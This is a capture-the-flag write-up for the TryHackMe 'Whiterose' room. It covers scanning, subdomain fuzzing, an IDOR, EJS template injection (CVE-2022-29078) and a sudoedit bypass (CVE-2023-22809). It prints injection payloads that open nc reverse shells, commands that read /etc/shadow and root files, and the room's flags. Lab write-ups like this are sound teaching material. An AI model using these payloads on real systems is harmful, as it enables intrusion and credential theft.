# TryHackMe Whiterose Writeup

## namp scan

```
nmap -sCV 10.10.210.43
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 15:04 EDT
Nmap scan report for 10.10.210.43
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds

```

![image](https://github.com/user-attachments/assets/9ab68010-8435-40a1-af8e-43bad67a3d1e)

---

```
sudo nano /etc/hosts
```

![image](https://github.com/user-attachments/assets/e45cefd2-30bc-4f32-8a44-eb8cb491545c)

## gobuster

```
ffuf -u http://FUZZ.cyprusbank.thm/ -w /home/kali/Downloads/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

```
http://admin.cyprusbank.thm
```

![image](https://github.com/user-attachments/assets/97afe100-bade-4262-a6e5-ca157ff13bc9)

login with:

```
Olivia Cortez:olivi8
```

## idor

![image](https://github.com/user-attachments/assets/245feb1e-5493-49c9-89b0-fb655378a106)

on :

```
http://admin.cyprusbank.thm/messages/?c=0
```

![image](https://github.com/user-attachments/assets/411152ee-9f74-4142-8613-ecb0ec2872e4)

---

login with :

```
Gayle Bev:p~]P@5!6;rs558:q
```

###  in endpoint of settings 

<img width="1550" height="526" alt="image" src="https://github.com/user-attachments/assets/9a7ba6a7-c4d5-4f8d-bcde-73a73a4d600d" />

### found that password reflacted in page 

<img width="1418" height="515" alt="image" src="https://github.com/user-attachments/assets/b9312f7d-d151-4a23-8755-280c82a6467c" />

> #### try xss but not work

### when remove **`&password=a`**

<img width="1572" height="743" alt="image" src="https://github.com/user-attachments/assets/41335361-9737-402b-97ad-a0bea37acaef" />

<img width="756" height="409" alt="image" src="https://github.com/user-attachments/assets/b0c51d15-70d4-4d18-99d8-5a1c7158bc57" />

> ## found that it work with **`EJS`** THIS is popular javascript template engine  

### search on **`ejs ssti`** i found 

[EJS, Server side template injection ejs@3.1.9 Latest](https://github.com/mde/ejs/issues/720)

<img width="1207" height="417" alt="image" src="https://github.com/user-attachments/assets/ae6d4bce-9306-42e4-87d2-6eac9782d0cd" />

[EJS, Server side template injection RCE (CVE-2022-29078)](https://eslam.io/posts/ejs-server-side-template-injection-rce/)

<img width="1175" height="395" alt="image" src="https://github.com/user-attachments/assets/9a268b36-6321-4880-85f6-3e1a3836aaad" />

### search on **`CVE-2022-29078`**  

### [Snyk Vulnerability Database](https://security.snyk.io/vuln/SNYK-JS-EJS-2803307)

<img width="1262" height="472" alt="image" src="https://github.com/user-attachments/assets/c15141ec-b52f-4fda-8c0b-504910c184fc" />

```
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
```

---

```
name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 192.168.168.188 4444 -e bash');s
```

<img width="1528" height="715" alt="image" src="https://github.com/user-attachments/assets/83d3b89e-0745-446c-bdcc-591ee0836edc" />

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="625" height="206" alt="image" src="https://github.com/user-attachments/assets/73c78afa-dff8-4a8d-a9fc-c5c13cb1548a" />

```
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```

## privesc

```
sudo -l 
```

<img width="932" height="206" alt="image" src="https://github.com/user-attachments/assets/9c9aa2cb-f3ce-40f5-8c91-d3c2f6757f0d" />

[CVE-2023-22809: Sudoedit Bypass](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis)

```
export EDITOR="vi -- /etc/shadow"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

```
export EDITOR="vi -- /root/root.txt"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

<img width="1064" height="449" alt="image" src="https://github.com/user-attachments/assets/64ea704e-608d-4505-be1b-9263f4f09668" />

```
THM{4nd_uR_p4ck4g3s}
```

